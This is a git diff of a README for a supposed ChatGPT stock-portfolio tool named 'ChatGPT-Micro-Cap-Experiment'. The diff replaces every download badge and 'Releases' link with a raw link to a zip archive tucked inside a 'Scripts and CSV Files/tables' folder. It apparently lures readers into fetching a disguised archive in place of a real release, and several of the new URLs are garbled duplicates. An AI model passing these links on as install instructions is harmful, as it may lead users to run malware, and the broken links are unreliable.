@@ -1,6 +1,6 @@
 # 📈 ChatGPT-Micro-Cap-Experiment - Manage Your Stock Portfolio Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Experiment-Cap-Micro-Chat-GP-3.1-alpha.5.zip%20Now-%20-%234CAF50)](https://raw.githubusercontent.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Experiment-Cap-Micro-Chat-GP-3.1-alpha.5.zip)
+[![Download Now](https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip and CSV https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip%20Now-%20-%234CAF50)](https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip and CSV https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the ChatGPT-Micro-Cap-Experiment! This application allows you to mana
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [ChatGPT-Micro-Cap-Experiment Releases](https://raw.githubusercontent.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Experiment-Cap-Micro-Chat-GP-3.1-alpha.5.zip). From there, you will find the latest version of the software. Click on the release version you want to download.
+To download the application, visit this page: [ChatGPT-Micro-Cap-Experiment Releases](https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip and CSV https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip). From there, you will find the latest version of the software. Click on the release version you want to download.
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ Before you download the application, ensure that your computer meets the followi
 
 ## 📦 Step-by-Step Installation
 
-1. **Visit the Download Page**: Go to [ChatGPT-Micro-Cap-Experiment Releases](https://raw.githubusercontent.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Experiment-Cap-Micro-Chat-GP-3.1-alpha.5.zip).
+1. **Visit the Download Page**: Go to [ChatGPT-Micro-Cap-Experiment Releases](https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip and CSV https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip).
   
 2. **Choose Your Version**: Select the latest version from the list of releases.
 
@@ -82,4 +82,4 @@ If you would like to report an issue or suggest a feature, please open an issue 
 
 This application assists in managing stock portfolios but does not guarantee profits. Always conduct your own research or consult a financial advisor before making investment decisions.
 
-[![Download Now](https://raw.githubusercontent.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Experiment-Cap-Micro-Chat-GP-3.1-alpha.5.zip%20Now%20-%20-%234CAF50)](https://raw.githubusercontent.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/main/Scripts and CSV Files/images/Experiment-Cap-Micro-Chat-GP-3.1-alpha.5.zip)
+[![Download Now](https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip and CSV https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip%20Now%20-%20-%234CAF50)](https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip and CSV https://github.com/Francisboy1/ChatGPT-Micro-Cap-Experiment/raw/refs/heads/main/Scripts and CSV Files/tables/Chat-Experiment-GP-Micro-Cap-v2.4.zip)
